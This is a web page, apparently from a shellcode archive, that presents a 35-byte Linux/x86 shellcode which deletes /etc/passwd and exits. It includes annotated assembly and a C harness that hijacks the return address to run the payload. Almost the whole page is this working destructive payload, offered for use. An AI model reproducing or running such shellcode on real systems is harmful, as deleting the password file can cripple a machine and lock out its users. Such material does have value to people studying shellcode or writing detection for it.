<html><head><title>Linux/x86 - unlink(/etc/passwd) &amp; exit() - 35 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
    unlink_passwd.c
    Platform: linux/x86
    Size: 35 bytes
    Author: $andman &lt;n4mdn4s[4T]gmail.com&gt;
*/

#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
char shell[] =  &quot;\xeb\x11&quot;                 //jmp    8048073
                &quot;\x5e&quot;                     //pop    %esi
                &quot;\x31\xc0&quot;                 //xor    %eax,%eax
                &quot;\x31\xc9&quot;                 //xor    %ecx,%ecx
                &quot;\x31\xd2&quot;                 //xor    %edx,%edx
                &quot;\xb0\x0a&quot;                 //mov    $0xa,%al
                &quot;\x89\xf3&quot;                 //mov    %esi,%ebx
                &quot;\xcd\x80&quot;                 //int    $0x80
                &quot;\xb0\x01&quot;                 //mov    $0x1,%al
                &quot;\xcd\x80&quot;                 //int    $0x80
                &quot;\xe8\xea\xff\xff\xff&quot;     //call    8048062
                &quot;\x2f&quot;                          
                &quot;\x65&quot;                         
                &quot;\x74\x63&quot;                   
                &quot;\x2f&quot;                          
                &quot;\x70\x61&quot;                   
                &quot;\x73\x73&quot;                   
                &quot;\x77\x64&quot;;   
               
int main()
{
  printf(&quot;Shellcode Length: %d\n&quot;,strlen(shell));
  int *ret;
  ret = (int *)&amp;ret + 2;
  (*ret) = (int)shell;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
